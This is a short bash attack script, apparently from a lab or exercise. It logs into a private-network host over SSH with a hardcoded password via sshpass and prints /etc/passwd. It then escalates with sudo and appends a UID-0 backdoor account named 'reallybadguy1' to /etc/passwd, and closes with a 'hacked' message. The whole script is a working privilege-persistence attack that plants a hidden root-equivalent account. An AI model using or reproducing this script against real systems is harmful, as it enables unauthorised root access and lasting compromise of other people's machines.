#!/bin/bash


sshpass -p '123' ssh linux1@172.20.10.10 << EOF
echo 'old passwd file'
echo ''
cat /etc/passwd
echo ''

sudo su

echo 'reallybadguy1:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
echo ''
echo ''
echo 'new passwd file after exploit'
echo ' '
cat /etc/passwd

echo 'hacked !!! have fun ;)'
EOF
